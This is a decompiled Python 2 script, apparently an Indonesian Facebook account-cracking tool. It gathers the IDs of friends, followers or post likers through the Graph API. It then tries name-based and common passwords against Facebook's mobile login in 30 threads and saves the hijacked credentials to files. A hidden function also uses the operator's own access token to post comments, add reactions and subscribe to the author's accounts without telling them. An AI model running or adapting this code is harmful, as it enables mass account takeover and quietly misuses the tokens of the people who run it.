# uncompyle6 by Tech Abm
# sorry bro for decompiling :)
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <haMzah>
import requests, sys, os, subprocess, random, time, re, json
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

loop = 0
ok = []
cp = []
id = []
ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
s = requests.Session()
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
    os.system('clear')
    print '  \x1b[0;91m___ ___ __  __ ___ ___ \n \x1b[0;91m/ __|_ _|  \\/  | _ ) __| \x1b[0;96mAU\x1b[0;97m : ANGGAXD\n\x1b[0;97m \\__ \\| || |\\/| | _ \\ _|  \x1b[0;91mIG\x1b[0;97m : GAAARZXD\n\x1b[0;97m |___/___|_|  |_|___/_|   \x1b[0;93mGH\x1b[0;97m : ANGGAXD'


def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('rm -rf login.txt')

    una = '100015073506062'
    post = '1031861840659590'
    post2 = '1110619372783836'
    kom = 'GW PAKE SC LU BANG \xf0\x9f\x98\x8d\xf0\x9f\x98\x98\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl'
    kom2 = 'KEREN BANG \xf0\x9f\x98\x98\xf0\x9f\x98\x98\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl'
    reac = 'LOVE'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/100002163187650/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
    menu()


def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        logo()
        print '\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs'
        token = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Your Token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            avsid = open('login.txt', 'w')
            avsid.write(token)
            avsid.close()
            print ' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Login Successfully'
            bot_komen()
        except KeyError:
            exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid')


def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('clear')
        os.system('rm -rf login.txt')
        tokenz()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        username = a['username']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('rm -rf login.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Connection'
        sys.exit()

    logo()
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] User Active : %s' % nama
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] IP Address  : ' + ip
    print ' \x1b[0;97m[\x1b[0;93m#\x1b[0;97m] --------------------------------------------'
    print ' \x1b[0;97m[\x1b[0;96m1\x1b[0;97m] Crack From Public FriendList'
    print ' \x1b[0;97m[\x1b[0;96m2\x1b[0;97m] Crack From Follower'
    print ' \x1b[0;97m[\x1b[0;96m3\x1b[0;97m] Crack From Reaction'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Logout (delete token)'
    ask = raw_input('\n \x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Choose : ')
    if ask == '':
        menu()
    elif ask == '1' or ask == '01':
        public()
    elif ask == '2' or ask == '02':
        followers()
    elif ask == '3' or ask == '03':
        reaction()
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        exit(' \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Successfully Delete Token')
    else:
        menu()


def public():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        tokenz()

    print "\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Fill In 'me' To Crack From The Friends List"
    idt = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] ID Public : ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
    except KeyError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] ID Public Not Found')

    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)

    print ' \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Total ID  : \x1b[0;91m' + str(len(id))
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;92mOK\x1b[0;97m Saved In : results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;93mCP\x1b[0;97m Saved In : results/CP-%s-%s-%s.txt\n' % (ha, op, ta)

    def main(user):
        global loop
        print '\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        uid, name = user.split('|')
        try:
            os.mkdir('results')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'sayang', 'anjing', 'bangsat']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92m* --> ' + uid + '|' + pw + '                  '
                    ok.append(uid + '|' + pw)
                    save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93m* --> ' + uid + '|' + pw + '                  '
                    cp.append(uid + '|' + pw)
                    save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    exit('\n \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Finished')


def followers():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        tokenz()

    print "\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Fill In 'me' To Crack From The Followers"
    idt = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] ID Public : ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
    except KeyError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] ID Public Not Found')

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=5000&access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)

    print ' \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Total ID  : \x1b[0;91m' + str(len(id))
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;92mOK\x1b[0;97m Saved In : results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;93mCP\x1b[0;97m Saved In : results/CP-%s-%s-%s.txt\n' % (ha, op, ta)

    def main(user):
        global loop
        print '\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        uid, name = user.split('|')
        try:
            os.mkdir('results')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'sayang', 'anjing', 'bangsat']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92m* --> ' + uid + '|' + pw + '                  '
                    ok.append(uid + '|' + pw)
                    save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93m* --> ' + uid + '|' + pw + '                  '
                    cp.append(uid + '|' + pw)
                    save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    exit('\n \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Finished')


def reaction():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        tokenz()

    print '\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Ex :/post/\x1b[0;92m629986xxxxx\x1b[0;97m (only id post)'
    idt = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] ID Post : ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
    except KeyError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] ID Postingan Not Found')

    r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=5000&access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)

    print ' \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Total ID  : \x1b[0;91m' + str(len(id))
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;92mOK\x1b[0;97m Saved In : results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;93mCP\x1b[0;97m Saved In : results/CP-%s-%s-%s.txt\n' % (ha, op, ta)

    def main(user):
        global loop
        print '\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        uid, name = user.split('|')
        try:
            os.mkdir('results')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'sayang', 'anjing', 'bangsat']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92m* --> ' + uid + '|' + pw + '                  '
                    ok.append(uid + '|' + pw)
                    save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93m* --> ' + uid + '|' + pw + '                  '
                    cp.append(uid + '|' + pw)
                    save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    exit('\n \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Finished')


if __name__ == '__main__':
    os.system('git pull')
    menu()
